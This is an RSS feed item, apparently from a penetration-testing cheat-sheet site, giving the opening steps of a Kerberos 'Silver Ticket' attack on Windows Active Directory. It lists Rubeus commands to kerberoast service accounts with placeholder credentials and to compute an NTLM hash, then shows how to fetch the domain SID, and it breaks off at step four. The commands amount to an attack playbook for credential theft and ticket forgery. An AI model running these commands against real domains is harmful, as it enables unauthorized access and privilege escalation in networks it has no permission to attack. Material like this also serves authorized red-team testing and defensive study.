channel.title: GetUserSPNs on TLDRBins
channel.description: Recent content in GetUserSPNs on TLDRBins

item.title: Silver Ticket
item.description: From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap 2. Generate NTLM .\rubeus.exe hash /password:<PASSWORD> 3. Get domain SID 3a. Locally import-module activedirectory Get-ADDomain | fl DomainSID 3b. Remotely # Install ldp.exe (Windows 11) Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services' # Bind > Bind with credentials ldp.exe # Browse > Search BaseDN: DC=<example>,DC=<com> Filter: (objectclass=User) 4.
